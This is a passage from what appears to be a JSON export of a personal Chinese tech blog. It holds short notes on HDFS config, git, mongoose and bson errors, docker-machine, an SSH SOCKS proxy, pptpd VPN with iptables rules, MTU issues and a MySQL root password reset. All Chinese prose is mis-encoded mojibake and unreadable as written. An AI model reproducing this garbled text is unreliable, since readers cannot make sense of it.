ï¼š1å°æœºå™¨ï¼Œæ•°æ®å¤‡ä»½é»˜è®¤è®¾ç½®ä¸º3ï¼Œé€šè¿‡webhdfså†™æŠ¥é”™ã€‚ä¿®æ”¹å¤‡ä»½æ•°ä¸º1æ­£å¸¸ã€‚[quote]hdfs-site.conf[/quote][code]&lt;configuration&gt;&lt;property&gt;&lt;name&gt;dfs.namenode.secondary.http-address&lt;/name&gt;&lt;value&gt;master:9001&lt;/value&gt;&lt;/property&gt;&lt;property&gt;&lt;name&gt;dfs.namenode.name.dir&lt;/name&gt;&lt;value&gt;file:/data/hadoop/dfs/name&lt;/value&gt;&lt;/property&gt;&lt;property&gt;&lt;name&gt;dfs.datanode.data.dir&lt;/name&gt;&lt;value&gt;file:/data/hadoop/dfs/data&lt;/value&gt;&lt;/property&gt;&lt;property&gt;&lt;name&gt;dfs.replication&lt;/name&gt;&lt;value&gt;1&lt;/value&gt;&lt;/property&gt;&lt;property&gt;&lt;name&gt;dfs.webhdfs.enabled&lt;/name&gt;&lt;value&gt;true&lt;/value&gt;&lt;/property&gt;&lt;property&gt;&lt;name&gt;dfs.support.append&lt;/name&gt;&lt;value&gt;true&lt;/value&gt;&lt;/property&gt;&lt;property&gt;&lt;name&gt;dfs.support.broken.append&lt;/name&gt;&lt;value&gt;true&lt;/value&gt;&lt;/property&gt;&lt;/configuration&gt;[/code]","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"hdfs","slug":"hdfs","permalink":"https://wangxiuwen.github.io/tags/hdfs/"}],"author":"wangxiuwen"},{"title":"git å¯ç”¨å¤§å°å†™æ•æ„Ÿ","slug":"history/tech/5953c4d0c2b92f5665eeda54","date":"2016-06-22T22:39:41.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda54/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda54/","excerpt":"","text":"åœ¨mac ä¸‹é¢å°†å·²ç»pushåˆ°è¿œç«¯çš„æ–‡ä»¶ï¼Œæ”¹å˜å…¶æ–‡ä»¶åçš„å¤§å°å†™æ—¶ï¼ŒGité»˜è®¤ä¼šè®¤ä¸ºæ–‡ä»¶æ²¡æœ‰å‘ç”Ÿä»»ä½•æ”¹åŠ¨ï¼Œä»è€Œæ‹’ç»æäº¤å’Œæ¨é€ï¼ŒåŸå› æ˜¯å…¶é»˜è®¤é…ç½®ä¸ºå¤§å°å†™ä¸æ•æ„Ÿï¼Œæ•…é¡»åœ¨bashä¸‹ä¿®æ”¹é…ç½®ï¼šgit config core.ignorecase false","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"git","slug":"git","permalink":"https://wangxiuwen.github.io/tags/git/"}],"author":"wangxiuwen"},{"title":"mongoose  mpromise æŠ¥é”™","slug":"history/tech/5953c4d0c2b92f5665eeda53","date":"2016-06-16T02:15:34.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda53/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda53/","excerpt":"","text":"mongoose mpromise æŠ¥é”™ï¼šcode DeprecationWarning: Mongoose: mpromise (mongooseâ€™s default promise library) is deprecated, plug in your own promise library instead: http://mongoosejs.com/docs/promises.html[/code]è§£å†³æ–¹æ¡ˆï¼š[code]mongoose.Promise = global.Promise;[/code]","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"nodejs","slug":"nodejs","permalink":"https://wangxiuwen.github.io/tags/nodejs/"}],"author":"wangxiuwen"},{"title":"koa-rest mongodb æŠ¥é”™","slug":"history/tech/5953c4d0c2b92f5665eeda52","date":"2016-06-15T03:23:51.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda52/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda52/","excerpt":"","text":"[code]WangWilliamdeMacBook-Pro-3:koa-rest wangwilliam$ npm test&gt; koa-rest@1.0.0 test /Users/wangwilliam/projects/others/koa-rest&gt; mocha --harmony{ Error: Cannot find module â€˜â€¦/build/Release/bsonâ€™at Function.Module._resolveFilename (module.js:440:15)at Function.Module._load (module.js:388:25)at Module.require (module.js:468:17)at require (internal/module.js:20:19)at Object.&lt;anonymous&gt; (/Users/wangwilliam/projects/others/koa-rest/node_modules/bson/ext/index.js:15:10)at Module._compile (module.js:541:32)at Object.Module._extensionsâ€¦js (module.js:550:10)at Module.load (module.js:458:32)at tryModuleLoad (module.js:417:12)at Function.Module._load (module.js:409:3)at Module.require (module.js:468:17)at require (internal/module.js:20:19)at Object.&lt;anonymous&gt; (/Users/wangwilliam/projects/others/koa-rest/node_modules/bson/lib/bson/index.js:3:24)at Module._compile (module.js:541:32)at Object.Module._extensionsâ€¦js (module.js:550:10)at Module.load (module.js:458:32)at tryModuleLoad (module.js:417:12)at Function.Module._load (module.js:409:3)at Module.require (module.js:468:17)at require (internal/module.js:20:19)at Object.&lt;anonymous&gt; (/Users/wangwilliam/projects/others/koa-rest/node_modules/mongodb/lib/mongodb/index.js:2:22)at Module._compile (module.js:541:32)at Object.Module._extensionsâ€¦js (module.js:550:10)at Module.load (module.js:458:32)at tryModuleLoad (module.js:417:12)at Function.Module._load (module.js:409:3)at Module.require (module.js:468:17)at require (internal/module.js:20:19)at Object.&lt;anonymous&gt; (/Users/wangwilliam/projects/others/koa-rest/node_modules/monk/node_modules/mongoskin/lib/index.js:14:13)at Module._compile (module.js:541:32)at Object.Module._extensionsâ€¦js (module.js:550:10)at Module.load (module.js:458:32)at tryModuleLoad (module.js:417:12)at Function.Module._load (module.js:409:3)at Module.require (module.js:468:17)at require (internal/module.js:20:19)at Object.&lt;anonymous&gt; (/Users/wangwilliam/projects/others/koa-rest/node_modules/monk/node_modules/mongoskin/index.js:1:132)at Module._compile (module.js:541:32)at Object.Module._extensionsâ€¦js (module.js:550:10)at Module.load (module.js:458:32)at tryModuleLoad (module.js:417:12)at Function.Module._load (module.js:409:3)at Module.require (module.js:468:17)at require (internal/module.js:20:19)at Object.&lt;anonymous&gt; (/Users/wangwilliam/projects/others/koa-rest/node_modules/monk/lib/manager.js:5:17)at Module._compile (module.js:541:32)at Object.Module._extensionsâ€¦js (module.js:550:10)at Module.load (module.js:458:32)at tryModuleLoad (module.js:417:12)at Function.Module._load (module.js:409:3)at Module.require (module.js:468:17)at require (internal/module.js:20:19)at Object.&lt;anonymous&gt; (/Users/wangwilliam/projects/others/koa-rest/node_modules/monk/lib/monk.js:6:28)at Module._compile (module.js:541:32)at Object.Module._extensionsâ€¦js (module.js:550:10)at Module.load (module.js:458:32)at tryModuleLoad (module.js:417:12)at Function.Module._load (module.js:409:3)at Module.require (module.js:468:17)at require (internal/module.js:20:19)at Object.&lt;anonymous&gt; (/Users/wangwilliam/projects/others/koa-rest/controllers/books.js:4:12)at Module._compile (module.js:541:32)at Object.Module._extensionsâ€¦js (module.js:550:10)at Module.load (module.js:458:32)at tryModuleLoad (module.js:417:12)at Function.Module._load (module.js:409:3)at Module.require (module.js:468:17)at require (internal/module.js:20:19)at Object.&lt;anonymous&gt; (/Users/wangwilliam/projects/others/koa-rest/app.js:2:13)at Module._compile (module.js:541:32)at Object.Module._extensionsâ€¦js (module.js:550:10)at Module.load (module.js:458:32)at tryModuleLoad (module.js:417:12)at Function.Module._load (module.js:409:3)at Module.require (module.js:468:17)at require (internal/module.js:20:19)at Object.&lt;anonymous&gt; (/Users/wangwilliam/projects/others/koa-rest/test/routeSpec.js:4:11)at Module._compile (module.js:541:32)at Object.Module._extensionsâ€¦js (module.js:550:10)at Module.load (module.js:458:32)at tryModuleLoad (module.js:417:12)at Function.Module._load (module.js:409:3)at Module.require (module.js:468:17)at require (internal/module.js:20:19)at /Users/wangwilliam/projects/others/koa-rest/node_modules/mocha/lib/mocha.js:220:27at Array.forEach (native)at Mocha.loadFiles (/Users/wangwilliam/projects/others/koa-rest/node_modules/mocha/lib/mocha.js:217:14)at Mocha.run (/Users/wangwilliam/projects/others/koa-rest/node_modules/mocha/lib/mocha.js:469:10)at Object.&lt;anonymous&gt; (/Users/wangwilliam/projects/others/koa-rest/node_modules/mocha/bin/_mocha:404:18)at Module._compile (module.js:541:32)at Object.Module._extensionsâ€¦js (module.js:550:10)at Module.load (module.js:458:32)at tryModuleLoad (module.js:417:12)at Function.Module._load (module.js:409:3)at Function.Module.runMain (module.js:575:10)at startup (node.js:160:18)at node.js:456:3 code: â€˜MODULE_NOT_FOUNDâ€™ }js-bson: Failed to load c++ bson extension, using pure JS version[/code]è§£å†³æ–¹æ¡ˆï¼š[quote]/Users/wangwilliam/projects/others/koa-rest/node_modules/bson/ext/index.js[/quote]å°†[code] // Load the precompiled win32 binaryif(process.platform == â€œwin32â€ &amp;&amp; process.arch == â€œx64â€) {bson = require(â€™./win32/x64/bsonâ€™);} else if(process.platform == â€œwin32â€ &amp;&amp; process.arch == â€œia32â€) {bson = require(â€™./win32/ia32/bsonâ€™);} else {bson = require(â€™â€¦/build/Release/bsonâ€™);} [/code]ä¿®æ”¹ä¸ºï¼š[code] // Load the precompiled win32 binaryif(process.platform == â€œwin32â€ &amp;&amp; process.arch == â€œx64â€) {bson = require(â€™./win32/x64/bsonâ€™);} else if(process.platform == â€œwin32â€ &amp;&amp; process.arch == â€œia32â€) {bson = require(â€™./win32/ia32/bsonâ€™);} else {bson = require(â€˜bsonâ€™);} [/code]","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"nodejs","slug":"nodejs","permalink":"https://wangxiuwen.github.io/tags/nodejs/"}],"author":"wangxiuwen"},{"title":"nodejs mac ä¸‹è“ç‰™","slug":"history/tech/5953c4d0c2b92f5665eeda51","date":"2016-06-11T18:16:23.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda51/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda51/","excerpt":"","text":"ä¸»è®¾å¤‡ï¼šnobleä»è®¾å¤‡ï¼šbleno","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"nodejs","slug":"nodejs","permalink":"https://wangxiuwen.github.io/tags/nodejs/"}],"author":"wangxiuwen"},{"title":"nodejs module.parent","slug":"history/tech/5953c4d0c2b92f5665eeda50","date":"2016-06-05T19:08:46.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda50/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda50/","excerpt":"","text":"module.parent å¯¹è±¡","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"nodejs","slug":"nodejs","permalink":"https://wangxiuwen.github.io/tags/nodejs/"}],"author":"wangxiuwen"},{"title":"centos 7 å®‰è£… pptpd vpn","slug":"history/tech/5953c4d0c2b92f5665eeda4f","date":"2016-06-03T19:17:03.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda4f/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda4f/","excerpt":"","text":"å®‰è£… pptpï¼š[code] yum -y install ppp pptpd[/code]é…ç½®pptpdï¼š[code]vi /etc/pptpd.conflocalip 192.168.100.100remoteip 192.168.100.101-110vi /etc/ppp/options.pptpdms-dns 8.8.8.8ms-dns 8.8.4.4vi /etc/ppp/chap-secrets[/code]é…ç½®å†…æ ¸è½¬å‘ï¼š[code]vi /etc/sysctl.confnet.ipv4.ip_forward = 1sysctl -p[/code]pptpd å¼€æœºå¯åŠ¨ï¼š[code]/bin/systemctl start pptpd.servicesystemctl enable pptpd.service[/code]å®‰è£…iptables å¹¶æ·»åŠ è§„åˆ™ï¼š[code] yum install iptables-services -yiptables -t nat -A POSTROUTING -s 192.1.100.0/24 -j SNAT --to-source 58.33.244.126iptables -A FORWARD -p tcp --syn -s 192.1.100.0/255.255.255.0 -j TCPMSS --set-mss 1356service iptables saveiptables: Saving firewall rules to /etc/sysconfig/iptables:[ OKsystemctl enable iptables[/code]","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"linux","slug":"linux","permalink":"https://wangxiuwen.github.io/tags/linux/"}],"author":"wangxiuwen"},{"title":"OS X å®‰è£… lrzsz","slug":"history/tech/5953c4d0c2b92f5665eeda4e","date":"2016-06-03T04:37:43.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda4e/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda4e/","excerpt":"","text":"æœåŠ¡å™¨å®‰è£…ï¼š[code]apt-get install lrzsz[/code]mac å®‰è£…ï¼š[code]brew install lrzsz[/code]ä¸‹è½½å‘½ä»¤è„šæœ¬ï¼š[code]git clone https://github.com/mmastrac/iterm2-zmodem.gitcd iterm2-zmodemcp ./item* /usr/local/bin/chmod 777 /usr/local/bin/item*[/code]item command ï¼‹ ï¼Œ[attach]7[/attach][attach]6[/attach][code] Regular expression: rz waiting to receive.**B0100Action: Run Silent CoprocessParameters: /usr/local/bin/iterm2-send-zmodem.shRegular expression: \\*\\*B00000000000000 Action: Run Silent Coprocess Parameters: /usr/local/bin/iterm2-recv-zmodem.sh[/code]","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"OSX","slug":"OSX","permalink":"https://wangxiuwen.github.io/tags/OSX/"}],"author":"wangxiuwen"},{"title":"git åˆ†æ”¯å¸¸ç”¨å‘½ä»¤","slug":"history/tech/5953c4d0c2b92f5665eeda4d","date":"2016-06-02T03:09:43.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda4d/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda4d/","excerpt":"","text":"æ˜¾ç¤ºoriginä»“åº“ä¸‹æ‰€æœ‰åˆ†æ”¯ï¼š[code]git remote show origin[/code]å°†æœ¬åœ°developåˆ†æ”¯æ¨åˆ°mochaä»“åº“masteråˆ†æ”¯[code]git push mocha develop:master[/code]","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"git","slug":"git","permalink":"https://wangxiuwen.github.io/tags/git/"}],"author":"wangxiuwen"},{"title":"docker åˆ é™¤äº† ~/.docker æŠ¥é”™","slug":"history/tech/5953c4d0c2b92f5665eeda4b","date":"2016-06-01T00:06:26.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda4b/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda4b/","excerpt":"","text":"docker åˆ é™¤äº† ~/.docker æŠ¥é”™ï¼š[code]Last login: Wed Jun 1 07:57:49 on ttys000localhost:~ wangwilliam$ bash --login â€˜/Applications/Docker/Docker Quickstart Terminal.app/Contents/Resources/Scripts/start.shâ€™Error checking TLS connection: Something went wrong running an SSH command!command : ip addr showerr : exit status 255[/code]è§£å†³ï¼š[code]$ docker-machine rm default$ docker-machine create --driver virtualbox default[/code]","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"docker","slug":"docker","permalink":"https://wangxiuwen.github.io/tags/docker/"}],"author":"wangxiuwen"},{"title":"MAC ä¸‹ docker æŠ¥é”™ Cannot connect to the Docker daemon","slug":"history/tech/5953c4d0c2b92f5665eeda4c","date":"2016-05-31T22:11:20.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda4c/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda4c/","excerpt":"","text":"[code]WangWilliamdeMacBook-Pro-3:~ wangwilliam$ docker ps -aCannot connect to the Docker daemon. Is the docker daemon running on this host?WangWilliamdeMacBook-Pro-3:~ wangwilliam$ docker versionClient:Version: 1.11.1API version: 1.23Go version: go1.5.4Git commit: 5604cbeBuilt: Tue Apr 26 23:44:17 2016OS/Arch: darwin/amd64Cannot connect to the Docker daemon. Is the docker daemon running on this host?[/code]è§£å†³æ–¹æ¡ˆï¼šåœ¨shellä¸­æ‰§è¡Œï¼š[code]eval &quot;$(docker-machine env default)&quot;[/code]","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"docker","slug":"docker","permalink":"https://wangxiuwen.github.io/tags/docker/"}],"author":"wangxiuwen"},{"title":"mac ssh ä»£ç†","slug":"history/tech/5953c4d0c2b92f5665eeda4a","date":"2016-05-31T17:19:09.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda4a/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda4a/","excerpt":"","text":"[code]ssh -qTfnN -D 8080 root@qianrushi.org[/code][code]ssh -qTfnN -D 7070 username@remote_serverAll the added options are for a ssh session thatâ€™s used for tunneling.-q :- be very quite, we are acting only as a tunnel.-T :- Do not allocate a pseudo tty, we are only acting a tunnel.-f :- move the ssh process to background, as we donâ€™t want to interact with this ssh session directly.-N :- Do not execute remote command.-n :- redirect standard input to /dev/null.In addition on a slow line you can gain performance by enabling compression with the -C option.[/code]","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"OSX","slug":"OSX","permalink":"https://wangxiuwen.github.io/tags/OSX/"}],"author":"wangxiuwen"},{"title":"å–æ–‡ä»¶ç¬¬ä¸€è¡Œ æœ€åä¸€è¡Œ æˆªå–è¡ŒæŒ‡å®šéƒ¨åˆ†  æˆªå–æ–‡ä»¶åæŒ‡å®šéƒ¨åˆ†","slug":"history/tech/5953c4d0c2b92f5665eeda49","date":"2016-05-31T02:29:25.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda49/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda49/","excerpt":"","text":"å–æ–‡ä»¶ç¬¬ä¸€è¡Œ æœ€åä¸€è¡Œ æˆªå–è¡ŒæŒ‡å®šéƒ¨åˆ† æˆªå–æ–‡ä»¶åæŒ‡å®šéƒ¨åˆ†#!/bin/bash file_list=$(ls .) for file in $file_list do if [ -f $file ];then first=`head -1 $file` last=`tail -1 $file` msg=`echo $first | awk -F ':' '{print $2}'` echo ${file%-*} echo $first echo $last echo $msg fi done","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"shellè„šæœ¬","slug":"shellè„šæœ¬","permalink":"https://wangxiuwen.github.io/tags/shell%E8%84%9A%E6%9C%AC/"}],"author":"wangxiuwen"},{"title":"shell æˆªå–å­—ç¬¦ä¸²","slug":"history/tech/5953c4d0c2b92f5665eeda48","date":"2016-05-31T02:22:51.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda48/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda48/","excerpt":"","text":"æˆªå– â€˜-â€™ å·å‰é¢çš„å…ƒç´ [code]${var%-*}[/code]","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"shellè„šæœ¬","slug":"shellè„šæœ¬","permalink":"https://wangxiuwen.github.io/tags/shell%E8%84%9A%E6%9C%AC/"}],"author":"wangxiuwen"},{"title":"awk åŸºæœ¬åˆ†å‰²å‘½ä»¤","slug":"history/tech/5953c4d0c2b92f5665eeda47","date":"2016-05-31T02:21:35.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda47/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda47/","excerpt":"","text":"ä»¥å†’å·åˆ†å‰²ï¼Œå¹¶æ‰“å°ç¬¬äºŒä¸ªå…ƒç´ [code]awk -F â€˜:â€™ â€˜{print $2}â€™[/code]","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"shellè„šæœ¬","slug":"shellè„šæœ¬","permalink":"https://wangxiuwen.github.io/tags/shell%E8%84%9A%E6%9C%AC/"}],"author":"wangxiuwen"},{"title":"linux pptp vim æ‰“å¼€æ–‡ä»¶å¡æ­»","slug":"history/tech/5953c4d0c2b92f5665eeda46","date":"2016-05-30T02:40:42.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda46/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda46/","excerpt":"","text":"é—®é¢˜ï¼šå®¢æˆ·ç«¯Aï¼Œå®¢æˆ·ç«¯Båˆ†åˆ«è¿æ¥ pptp server ï¼Œå®¢æˆ·ç«¯Aé€šè¿‡sshç™»å½•å®¢æˆ·ç«¯Bï¼Œvim æ‰“å¼€æ–‡ä»¶å¡æ­»ã€‚çŒœæƒ³ï¼šç½‘ç»œmtuå¤§è¿‡äº†ä¸­é—´çš„ç½‘ç»œmtuå€¼ã€‚åˆ†åˆ«åœ¨server clientæ‰§è¡Œ[code]netstat -i[/code]å¯ä»¥çœ‹åˆ°ppp0é»˜è®¤çš„mtuå€¼éƒ½åœ¨300å·¦å³ã€‚åŸç†ï¼šMTU:Maximum Transmission Unit ç½‘ç»œä¸Šä¼ é€çš„æœ€å¤§æ•°æ®åŒ…ï¼Œå•ä½å­—èŠ‚ï¼Œé»˜è®¤ä¸€èˆ¬æ˜¯1500ã€‚å¤§äºmtuçš„åŒ…ï¼Œåœ¨ç³»ç»Ÿå±‚ä¼šè¢«æ‹†æˆå¤šä¸ªæ¥å‘ã€‚å„å±‚çº§çš„ç½‘ç»œè·¯ç”±è®¾å¤‡ï¼Œä¼šåå•†å¤§å®¶çš„mtuï¼Œé€‰æ‹©ä¸€ä¸ªæœ€å°çš„ã€‚åå•†mtuçš„æ—¶å€™è¦å‘é€ICMPåŒ…ï¼Œå¾ˆå¤šå‚å•†çš„é˜²ç«å¢™ä¼šå…³é—­å®ƒçš„ä¼ è¾“ï¼ˆé˜²ddosç­‰ï¼‰ã€‚çœŸå‡¶åœ¨æ­¤ã€‚åœ¨æ— æ³•å®ç°åå•†mtuçš„æ—¶å€™ï¼Œå„ç§äº‹ä»¶éƒ½ä¼šå½±å“mtuçš„ç¡®å®šï¼Œå®é™…è¡¨ç°ä¸ºåœ¨ä¼ å¤§æ–‡ä»¶çš„æ—¶å€™ï¼Œå¯»æ‰¾mtuçš„è¿‡ç¨‹ä¸­ï¼Œæ•°æ®åŒ…ä¸¢äº†ã€‚åŸç†åœ¨æ­¤ã€‚è§£å†³æ–¹æ¡ˆï¼šè§£å†³ä¸‹è½½æ…¢ï¼š[quote]server: /etc/ppp/options.pptpd æœ€åä¸€è¡Œæ·»åŠ  mtu 1500[/quote]è§£å†³ä¸Šä¼ æ…¢çš„é—®é¢˜ï¼š[quote]client: ifconfig ppp0 mtu 1500[/quote]","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"linux","slug":"linux","permalink":"https://wangxiuwen.github.io/tags/linux/"}],"author":"wangxiuwen"},{"title":"mysql é‡ç½®å¯†ç ","slug":"history/tech/5953c73311a1d5578f3f9a67","date":"2016-05-29T04:06:31.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/5953c73311a1d5578f3f9a67/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c73311a1d5578f3f9a67/","excerpt":"","text":"åœæ­¢mysqlæœåŠ¡ï¼š[code]service mysqld stop[size=13] [/size][/code]è·³è¿‡æˆæƒï¼š[code]mysqld_safe --skip-grant-tables[/code]ç™»å½•mysqlä¿®æ”¹å¯†ç ï¼š[code]# mysql -uroot -p ----è¦æ±‚è¾“å…¥å¯†ç æ—¶ï¼Œç›´æ¥å›è½¦å³å¯ã€‚&gt; use mysql;&gt; update user set password=PASSWORD(â€˜12345678â€™) where user=â€œrootâ€; //å°†rootå¯†ç è®¾ç½®ä¸º12345678&gt; flush privileges;&gt; 